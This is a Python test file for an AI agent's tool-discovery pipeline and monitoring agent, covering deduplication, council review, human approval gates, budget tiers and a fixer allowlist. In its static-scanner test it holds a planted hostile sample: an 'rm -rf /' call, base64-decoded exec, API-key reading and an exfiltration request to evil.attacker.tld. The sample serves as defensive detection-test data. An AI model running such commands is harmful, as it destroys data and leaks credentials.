"""
Tests for the Self-Expanding Pipeline (Subsystem 1) and the Monitoring Agent (Subsystem 2).

Run directly:  python3 test_expansion_monitor.py
No network, no real Supabase, no real Claude — an in-memory fake Supabase and
monkeypatched scouts/council, same approach used to verify task_manager.

Covers (per the plan):
  1. scout finding DEDUPLICATION (never resubmit a known URL, incl. within one run)
  2. council RUBRIC output format (required keys + decision in {approve,reject,defer})
  3. applicator APPROVAL-GATE enforcement (refuses to execute without human approval)
  4. static safety SCANNER (flags planted subprocess / base64-exec / creds / domains)
  5. council calibration backstop (deterministic downgrade of an over-eager 'approve')
  6. scout query distillation (long brief -> tight queries, never crashes without claude)
  7. budget TIER TRANSITIONS (ok/warn/throttle/shutdown boundaries) + is_agent_allowed
  8. fixer ALLOWLIST enforcement (only listed problem types auto-act; rest propose)
"""

import json
import os
import sys

import expansion_pipeline as ep
import monitor as mon


# ---- in-memory fake Supabase (chainable, mimics the client surface we use) ----
class FakeQuery:
    def __init__(self, store, table):
        self.store, self.table_name = store, table
        self._filters, self._op, self._payload = [], None, None

    def insert(self, row): self._op, self._payload = "insert", row; return self
    def update(self, row): self._op, self._payload = "update", row; return self
    def select(self, *a): self._op = "select"; return self
    def eq(self, k, v): self._filters.append((k, v)); return self
    def order(self, *a, **k): return self
    def limit(self, n): return self

    def execute(self):
        if self._op == "insert":
            rid = len(self.store["_all"]) + 1
            rec = {"id": rid, "agent_name": self._payload["agent_name"],
                   "output_text": self._payload["output_text"],
                   "created_at": f"2026-07-20T00:00:{rid:02d}-04:00"}
            self.store["_all"].append(rec)
            return type("R", (), {"data": [rec]})
        if self._op == "update":
            for rec in self.store["_all"]:
                if all(rec.get(k) == v for k, v in self._filters):
                    rec.update(self._payload)
            return type("R", (), {"data": [1]})
        data = [r for r in self.store["_all"] if all(r.get(k) == v for k, v in self._filters)]
        data.sort(key=lambda r: r["id"], reverse=True)
        return type("R", (), {"data": data})


class FakeSB:
    def __init__(self): self.store = {"_all": []}
    def table(self, name): return FakeQuery(self.store, name)


PASS, FAIL = "PASS    ", "**FAIL**"
_results = []


def check(label, cond):
    _results.append(bool(cond))
    print(f"{PASS if cond else FAIL} {label}")


def _reset(council_fn=None, feasibility_fn=None, tools=None):
    ep.init(claude_client=None, supabase_client=FakeSB(), tool_dispatcher=None,
            council_call_fn=council_fn or (lambda s, u: ""), log_council_fn=lambda *a, **k: None,
            tools_list=tools or [], excluded_tools=set(),
            feasibility_fn=feasibility_fn or (lambda *a, **k: "feasible enough"))


# ============================================================
def test_dedup():
    print("\n=== 1. scout dedup ===")
    _reset()
    # a finding already in the table
    ep._insert_finding({"name": "known", "url": "https://github.com/acme/known", "status": "found"})

    # scouts return: the known url (dup), a new url, and the new url AGAIN (in-run dup)
    ep.github_scout = lambda brief, cap: [
        {"name": "known", "url": "https://github.com/acme/known/", "what": "x"},   # trailing slash → same
        {"name": "fresh", "url": "https://github.com/acme/fresh", "what": "y"},
    ]
    ep.web_scout = lambda brief, cap: [
        {"name": "fresh-dup", "url": "https://github.com/acme/fresh", "what": "y2"},  # dup within run
        {"name": "other", "url": "https://example.com/tool", "what": "z"},
    ]
    out = ep.run_scout(focus_brief="test", sources="both", cap=10)

    urls = [json.loads(r["output_text"]).get("url") for r in ep.supabase.store["_all"]
            if r["agent_name"] == "expansion_finding"]
    check("known URL not resubmitted (dedupe vs table)", urls.count("https://github.com/acme/known/") == 0)
    check("new URLs inserted exactly once each",
          sorted(u for u in urls if u != "https://github.com/acme/known") ==
          ["https://example.com/tool", "https://github.com/acme/fresh"])
    check("in-run duplicate collapsed (fresh added once)",
          urls.count("https://github.com/acme/fresh") == 1)
    check("summary reports the new count", "queued 2 new" in out)


# ============================================================
def test_rubric_format():
    print("\n=== 2. council rubric format ===")

    good_rubric = {
        "usefulness": 4, "integration_effort": "small", "maintenance_burden": "low",
        "security_risk": 2, "license_compatibility": "compatible", "overlap_with_existing": "none",
        "verdict": "Solid, low-risk, fills a real gap.", "decision": "approve",
    }

    def council_good(system, user):
        # rubric call is the one whose system prompt is the rubric system
        if "EXPANSION-REVIEW" in system:
            return "```json\n" + json.dumps(good_rubric) + "\n```"
        return "- a bullet"   # advocate / critic

    _reset(council_good)
    rid = ep._insert_finding({"name": "cand", "url": "https://github.com/a/b", "status": "found"})
    res = ep.expansion_review_one(rid, ep._find_row(rid))

    required = {"usefulness", "integration_effort", "maintenance_burden", "security_risk",
                "license_compatibility", "overlap_with_existing", "verdict", "decision"}
    check("rubric has all required keys", required.issubset(res["rubric"].keys()))
    check("decision ∈ {approve,reject,defer}", res["decision"] in ("approve", "reject", "defer"))
    check("approve → finding status 'approved'", ep._find_row(rid)["status"] == "approved")
    check("rubric persisted onto finding", ep._find_row(rid)["council"]["usefulness"] == 4)

    # unparseable rubric must FAIL-SAFE to 'defer' (never silently approve/drop)
    def council_junk(system, user):
        return "the council could not produce JSON, sorry"
    _reset(council_junk)
    rid2 = ep._insert_finding({"name": "c2", "url": "https://github.com/a/c", "status": "found"})
    res2 = ep.expansion_review_one(rid2, ep._find_row(rid2))
    check("unparseable rubric → deferred (fail-safe)", res2["decision"] == "defer"
          and ep._find_row(rid2)["status"] == "deferred")


# ============================================================
def test_approval_gate():
    print("\n=== 3. applicator approval gate ===")
    _reset()
    plan = {"finding_id": 1, "name": "risky", "url": "https://github.com/a/b",
            "pinned_commit": "deadbeef" * 5, "install_dir": "/tmp/should_never_be_created_by_test",
            "commands": [], "is_repo": True}

    # queue a PENDING (not approved) action, then try to execute
    action_id = ep._queue_install_approval(plan)
    check("_action_is_approved False while pending", ep._action_is_approved(action_id) is False)

    before = os.path.exists(plan["install_dir"])
    result = ep._execute_install(plan, action_id)
    check("execute REFUSES without approval", result["ok"] is False and "refused" in result["error"])
    check("nothing installed to disk when refused",
          before == os.path.exists(plan["install_dir"]) and not os.path.exists(plan["install_dir"]))

    # a repo plan with NO pinned commit must also be refused (no unpinned installs),
    # even if (hypothetically) approved.
    for rec in ep.supabase.store["_all"]:
        if rec["id"] == action_id:
            a = json.loads(rec["output_text"]); a["status"] = "approved"
            rec["output_text"] = json.dumps(a)
    unpinned = dict(plan, pinned_commit="")
    r2 = ep._execute_install(unpinned, action_id)
    check("execute refuses unpinned repo even when approved", r2["ok"] is False and "pin" in r2["error"])

    # apply_finding on a non-approved finding never reaches the installer
    rid = ep._insert_finding({"name": "x", "url": "https://github.com/a/b", "status": "found"})
    msg = ep.apply_finding(rid)
    check("apply_finding rejects a non-'approved' finding", "not 'approved'" in msg or "not approved" in msg)


# ============================================================
def test_static_scanner():
    print("\n=== 4. static safety scanner ===")
    risky = (
        "import subprocess, base64\n"
        "subprocess.run(['rm','-rf','/'])\n"
        "exec(base64.b64decode('cHJpbnQoMSk='))\n"
        "key = os.environ['OPENAI_API_KEY']\n"
        "import requests; requests.get('https://evil.attacker.tld/exfil')\n"
    )
    flags = ep._static_safety_scan(risky)
    cats = {f["category"] for f in flags}
    check("flags shell execution", "shell execution" in cats)
    check("flags dynamic code execution", "dynamic code execution" in cats)
    check("flags credential access", "credential / secret access" in cats)
    check("flags network call", "network call" in cats)
    domain_flag = next((f for f in flags if f["category"] == "outbound domains"), None)
    check("flags unexpected outbound domain",
          domain_flag is not None and "evil.attacker.tld" in domain_flag["domains"])

    clean = "def add(a, b):\n    return a + b\n"
    clean_cats = {f["category"] for f in ep._static_safety_scan(clean)}
    check("clean code raises no shell/exec/cred flags",
          not ({"shell execution", "dynamic code execution", "credential / secret access"} & clean_cats))


def test_calibration_backstop():
    print("\n=== 5. council calibration backstop ===")
    # model says 'approve' but risk is high → code downgrades to defer
    hi_risk = {"usefulness": 5, "security_risk": 5, "license_compatibility": "compatible",
               "overlap_with_existing": "none", "decision": "approve"}
    d, why = ep._calibrate_decision(hi_risk)
    check("high security_risk approve → defer", d == "defer" and "risk" in (why or ""))

    restrictive = {"usefulness": 5, "security_risk": 1, "license_compatibility": "restrictive",
                   "overlap_with_existing": "none", "decision": "approve"}
    check("restrictive license approve → defer", ep._calibrate_decision(restrictive)[0] == "defer")

    redundant = {"usefulness": 5, "security_risk": 1, "license_compatibility": "compatible",
                 "overlap_with_existing": "high", "decision": "approve"}
    check("high overlap approve → defer", ep._calibrate_decision(redundant)[0] == "defer")

    clean = {"usefulness": 5, "security_risk": 2, "license_compatibility": "compatible",
             "overlap_with_existing": "none", "decision": "approve"}
    check("clean high-value approve stays approve", ep._calibrate_decision(clean) == ("approve", None))

    # a model 'reject' is never hardened UP to approve by the backstop
    check("reject is preserved", ep._calibrate_decision({"decision": "reject"})[0] == "reject")

    # end-to-end: model returns approve+risk5, finding must land 'deferred'
    def council_riskapprove(system, user):
        if "EXPANSION-REVIEW" in system:
            return json.dumps(dict(hi_risk, verdict="looks great"))
        return "- bullet"
    _reset(council_riskapprove)
    rid = ep._insert_finding({"name": "risky", "url": "https://github.com/a/z", "status": "found"})
    res = ep.expansion_review_one(rid, ep._find_row(rid))
    check("e2e: risky 'approve' calibrated to deferred",
          res["decision"] == "defer" and ep._find_row(rid)["status"] == "deferred"
          and "calibration_override" in res["rubric"])


def test_query_distillation():
    print("\n=== 6. scout query distillation ===")
    _reset()
    # no claude wired (claude=None) → distill falls back to keyword extraction, never crashes
    qs = ep._distill_queries("Tools that would help with recent work: organize downloads and transcribe audio")
    check("distill returns at least one query", isinstance(qs, list) and len(qs) >= 1)
    check("fallback strips filler words",
          all("would" not in q and "that" not in q for q in qs))
    check("fallback keeps signal words", any("transcribe" in q or "organize" in q or "downloads" in q for q in qs))


def _mon_reset(monthly_cost=0.0, budget_usd=20.0, tiers=None):
    """Wire monitor at a fake Supabase, and stub its cost source so tier math is exact."""
    sb = FakeSB()
    mon.init(supabase_client=sb, claude_client=None, post_to_chat_fn=lambda *a, **k: None, health_mod=None)
    mon._LAST_TIER["tier"] = None
    mon._LAST_EVENT_ID_SEEN["id"] = 0
    mon._WORKER_RESTARTERS.clear()
    mon.spend_vs_budget = lambda: {
        "spend": monthly_cost, "budget": budget_usd, "pct": round(monthly_cost / budget_usd, 4),
        "tier": _tier_for(monthly_cost / budget_usd, tiers or {"warn": 0.5, "throttle": 0.8, "shutdown": 1.0}),
        "by_feature": [], "since": "2026-07-01T00:00:00-04:00",
    }
    return sb


def _tier_for(pct, tiers):
    if pct >= tiers["shutdown"]:
        return "shutdown"
    if pct >= tiers["throttle"]:
        return "throttle"
    if pct >= tiers["warn"]:
        return "warn"
    return "ok"


def test_budget_tiers():
    print("\n=== 7. budget tier transitions ===")
    # boundary values, budget=$20: ok < 50%, warn [50,80), throttle [80,100), shutdown >=100%
    cases = [(0.0, "ok"), (9.99, "ok"), (10.0, "warn"), (15.99, "warn"),
            (16.0, "throttle"), (19.99, "throttle"), (20.0, "shutdown"), (25.0, "shutdown")]
    for spend, expected in cases:
        _mon_reset(monthly_cost=spend, budget_usd=20.0)
        got = mon.spend_vs_budget()["tier"]
        check(f"${spend} / $20 → {expected}", got == expected)

    # is_agent_allowed: ok/warn → everyone; throttle/shutdown → only essential ('chat')
    for tier, spend in (("ok", 0.0), ("warn", 12.0)):
        _mon_reset(monthly_cost=spend, budget_usd=20.0)
        mon._LAST_TIER["tier"] = tier
        check(f"tier={tier}: non-essential agent allowed",
              mon.is_agent_allowed("expansion_pipeline") is True)
    for tier, spend in (("throttle", 17.0), ("shutdown", 21.0)):
        _mon_reset(monthly_cost=spend, budget_usd=20.0)
        mon._LAST_TIER["tier"] = tier
        check(f"tier={tier}: non-essential agent BLOCKED",
              mon.is_agent_allowed("expansion_pipeline") is False)
        check(f"tier={tier}: chat (essential) still allowed",
              mon.is_agent_allowed("chat") is True)

    # transition dedupe: same tier twice in a row → no repeated notification
    sb = _mon_reset(monthly_cost=0.0, budget_usd=20.0)
    notified = []
    mon.post_to_chat = lambda role, msg: notified.append(msg)
    mon.check_budget_tier()  # ok -> ok (first-ever call still counts as a "change" from unknown)
    first_count = len(notified)
    mon.check_budget_tier()  # ok -> ok again, no change
    check("repeated same-tier calls don't re-notify", len(notified) == first_count)

    # a real transition DOES notify with the numbers
    mon.spend_vs_budget = lambda: {"spend": 17.0, "budget": 20.0, "pct": 0.85, "tier": "throttle",
                                   "by_feature": [], "since": "x"}
    mon.check_budget_tier()
    check("a tier change produces a new notification",
          len(notified) == first_count + 1 and "throttle" in notified[-1])


def test_fixer_allowlist():
    print("\n=== 8. fixer allowlist enforcement ===")
    sb = _mon_reset()
    # write a minimal monitor_config with a SHORT allowlist (only restart) so we can
    # prove reject-vs-accept without touching the real config file's defaults.
    import monitor as m
    orig_cfg = m.monitor_config
    m.monitor_config = lambda: {"fixer_allowlist": ["restart_crashed_worker"], "scan_interval_seconds": 300}
    try:
        # allowlisted problem type with a registered restarter -> auto-acts
        ran = []
        m.register_worker("jarvis-fake-worker", lambda: ran.append(True))
        result = m.attempt_fix("restart_crashed_worker", "jarvis-fake-worker", "not running")
        check("allowlisted fix auto-acts", ran == [True] and result.startswith("auto-fixed"))

        # non-allowlisted problem type -> proposes, does NOT act
        acted = []
        m._FIXERS["clear_temp_dir"] = lambda **kw: acted.append(True) or "cleared"
        result2 = m.attempt_fix("clear_temp_dir", "somewhere", "disk full")
        check("non-allowlisted fix does NOT auto-act", acted == [])
        check("non-allowlisted fix proposes instead", result2.startswith("proposed"))

        # a pending action was actually queued for the proposal
        pending = [r for r in sb.store["_all"] if r["agent_name"] == "jarvis_pending_action"]
        check("proposal queued via the existing approval gate", len(pending) == 1)
    finally:
        m.monitor_config = orig_cfg


def test_report_event_roundtrip():
    print("\n=== 9. system_events log ===")
    _mon_reset()
    mon.report_event("test_component", "warning", "something looked off", "detail here")
    mon.report_event("test_component", "info", "just fyi")
    mon.report_event("test_component", "critical", "on fire")
    warn_up = mon.get_recent_events(limit=10, min_level="warning")
    check("min_level filter excludes 'info'", all(e["level"] != "info" for e in warn_up))
    check("min_level filter includes warning+critical", len(warn_up) == 2)
    everything = mon.get_recent_events(limit=10, min_level="info")
    check("no filter returns all 3", len(everything) == 3)
    check("newest first", everything[0]["message"] == "on fire")

    # Incident window: an old error must age out of the scan so a long-quiet
    # system goes back to healthy instead of showing stale "degraded" forever.
    sb = _mon_reset()
    mon.report_event("old_component", "error", "ancient failure")
    old_row = sb.store["_all"][-1]
    ev = json.loads(old_row["output_text"])
    ev["ts"] = "2026-07-01T00:00:00-04:00"  # far outside any window
    old_row["output_text"] = json.dumps(ev)
    mon.report_event("new_component", "error", "fresh failure")
    windowed = mon.get_recent_events(limit=10, min_level="error", max_age_hours=12)
    check("aged-out error is excluded from the window", all(e["message"] != "ancient failure" for e in windowed))
    check("fresh error stays inside the window", any(e["message"] == "fresh failure" for e in windowed))
    unwindowed = mon.get_recent_events(limit=10, min_level="error")
    check("no window (default) still returns everything", len(unwindowed) == 2)
    ev["ts"] = "not-a-date"
    old_row["output_text"] = json.dumps(ev)
    windowed2 = mon.get_recent_events(limit=10, min_level="error", max_age_hours=12)
    check("unparseable ts is kept, never hidden", any(e["message"] == "ancient failure" for e in windowed2))


if __name__ == "__main__":
    test_dedup()
    test_rubric_format()
    test_approval_gate()
    test_static_scanner()
    test_calibration_backstop()
    test_query_distillation()
    test_budget_tiers()
    test_fixer_allowlist()
    test_report_event_roundtrip()
    total, passed = len(_results), sum(_results)
    print(f"\n{'='*48}\n{passed}/{total} checks passed")
    sys.exit(0 if passed == total else 1)
